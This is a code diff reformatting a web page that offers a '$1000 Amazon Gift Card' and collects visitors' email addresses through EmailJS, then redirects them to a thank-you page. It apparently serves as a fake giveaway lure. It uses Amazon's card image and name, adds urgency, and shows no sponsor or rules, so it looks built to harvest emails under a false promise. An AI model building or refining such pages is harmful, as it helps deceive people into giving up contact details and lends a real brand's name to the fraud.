@@ -1,122 +1,62 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>$1,000 Amazon Gift‑Card Giveaway</title>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
-  <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    body {
-      font-family: 'Poppins', sans-serif;
-      background: #eef5f8;
-      color: #333;
-    }
-    .topbar {
-      background: #002742;
-      color: #fff;
-      text-align: center;
-      font-size: 26px;
-      font-weight: 600;
-      padding: 14px 8px;
-    }
-    .wrapper {
-      display: flex;
-      justify-content: center;
-      padding: 40px 16px;
-    }
-    .card {
-      background: #fff;
-      border-radius: 16px;
-      padding: 34px 24px 40px;
-      max-width: 500px;
-      width: 100%;
-      box-shadow: 0 12px 24px rgba(0, 0, 0, 0.08);
-      text-align: center;
-    }
-    h1 {
-      font-size: 32px;
-      color: #e48c00;
-      margin-bottom: 12px;
-      font-weight: 600;
-    }
-    p.tagline {
-      font-size: 18px;
-      margin-bottom: 22px;
-      line-height: 1.6;
-    }
-    .gift-img {
-      width: 100%;
-      max-width: 380px;
-      margin: 0 auto 28px;
-      border-radius: 8px;
-    }
-    form {
-      display: flex;
-      flex-direction: column;
-      gap: 16px;
-    }
-    input[type="email"] {
-      padding: 14px 16px;
-      font-size: 16px;
-      border: 2px solid #ddd;
-      border-radius: 8px;
-      outline: none;
-      transition: 0.25s;
-      width: 100%;
-    }
-    input[type="email"]:focus {
-      border-color: #e48c00;
-    }
-    button {
-      background: #e7a308;
-      color: #fff;
-      font-size: 20px;
-      font-weight: 600;
-      padding: 14px 0;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      transition: 0.25s;
-    }
-    button:hover {
-      background: #d49105;
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>$1 000 Amazon Gift‑Card Giveaway</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+<style>
+/* ============  نفس التنسيق الذى تعمل به ============ */
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Poppins',sans-serif;background:#eef5f8;color:#333}
+.topbar{background:#002742;color:#fff;text-align:center;font-size:26px;font-weight:600;padding:14px 8px}
+.wrapper{display:flex;justify-content:center;padding:40px 16px}
+.card{background:#fff;border-radius:16px;padding:34px 24px 40px;max-width:500px;width:100%;box-shadow:0 12px 24px rgb(0 0 0 / 8%);text-align:center}
+h1{font-size:32px;color:#e48c00;margin-bottom:12px;font-weight:600}
+p.tagline{font-size:18px;margin-bottom:22px;line-height:1.6}
+.gift-img{width:100%;max-width:380px;margin:0 auto 28px;border-radius:8px}
+form{display:flex;flex-direction:column;gap:16px}
+input[type=email]{padding:14px 16px;font-size:16px;border:2px solid #ddd;border-radius:8px;transition:.25s;width:100%}
+input[type=email]:focus{border-color:#e48c00}
+button{background:#e7a308;color:#fff;font-size:20px;font-weight:600;padding:14px 0;border:none;border-radius:8px;cursor:pointer;transition:.25s}
+button:hover{background:#d49105}
+</style>
 </head>
 <body>
+<div class="topbar">Limited‑Time Giveaway</div>
 
-  <div class="topbar">Limited‑Time Giveaway</div>
+<div class="wrapper">
+  <div class="card">
+    <h1>Win a $1000 Amazon Gift Card!</h1>
+    <p class="tagline">Enter your email below and claim your chance. This offer won’t last long!</p>
 
-  <div class="wrapper">
-    <div class="card">
-      <h1>Win a $1000 Amazon Gift Card!</h1>
-      <p class="tagline">Enter your email below and claim your chance. This offer won’t last long!</p>
-      <img class="gift-img" src="https://m.media-amazon.com/images/G/01/gc/designs/livepreview/amazon_dkblue_noto_email_v2016_us-main._CB468775337_.png" alt="Amazon Gift Card">
+    <img class="gift-img"
+         src="https://m.media-amazon.com/images/G/01/gc/designs/livepreview/amazon_dkblue_noto_email_v2016_us-main._CB468775337_.png"
+         alt="Amazon Gift Card">
 
-      <form id="leadForm">
-        <input type="email" id="user_email" name="user_email" placeholder="Enter your email" required>
-        <button type="submit">Claim Now</button>
-      </form>
-    </div>
+    <form id="leadForm">
+      <input type="email" name="user_email" placeholder="Enter your email" required>
+      <button type="submit">Claim Now</button>
+    </form>
   </div>
+</div>
 
-  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-  <script>
-    emailjs.init("UWtEugL5TIC6RfnFv");
+<!-- EmailJS SDK -->
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script>
+emailjs.init("UWtEugL5TIC6RfnFv");   // Public key
 
-    document.getElementById("leadForm").addEventListener("submit", function(e) {
-      e.preventDefault();
-      emailjs.sendForm("service_htt7fgh", "template_9exxth7", this)
-        .then(() => {
-          window.location.href = "thankyou.html";
-        })
-        .catch((error) => {
-          console.error("EmailJS Error:", error);
-          alert("Error, please try again later");
-        });
+document.getElementById("leadForm").addEventListener("submit",function(e){
+  e.preventDefault();
+  emailjs.sendForm("service_htt7fgh","template_9exxth7",this)
+    .then(()=>{
+      window.location.href="thankyou.html";
+    })
+    .catch(err=>{
+      console.error(err);
+      alert("EmailJS error: "+(err?.text || "please try again later"));
     });
-  </script>
-
+});
+</script>
 </body>
 </html>
